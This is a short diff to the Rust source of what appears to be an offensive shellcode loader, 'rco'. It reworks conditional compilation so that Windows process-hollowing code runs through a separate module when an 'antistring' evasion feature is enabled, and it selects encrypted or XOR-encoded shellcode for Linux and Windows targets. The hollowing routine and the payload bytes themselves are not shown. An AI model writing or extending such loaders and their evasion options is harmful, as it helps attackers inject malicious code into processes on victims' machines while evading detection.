@@ -16,12 +16,14 @@ const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
 const TARGET_PROCESS: &[u8] = rco_config::ENCRYPTED_LINUX_HOLLOWING_TARGET;
 
 // Load Windows implementation if the target OS is Windows
-#[cfg(windows)]
+#[cfg(all(windows, not(feature = "antistring")))]
 mod rco_process_hollowing_windows;
 #[cfg(all(windows, not(feature = "antistring")))]
 use rco_process_hollowing_windows::hollow_and_run;
 #[cfg(all(windows, feature = "antistring"))]
-use rco_process_hollowing_windows::antistring_hollow_and_run as hollow_and_run;
+mod rco_process_hollowing_windows_antistring;
+#[cfg(all(windows, feature = "antistring"))]
+use rco_process_hollowing_windows_antistring::hollow_and_run;
 // Determine which shellcode and target process to use based on features
 #[cfg(all(windows, not(feature = "xor")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
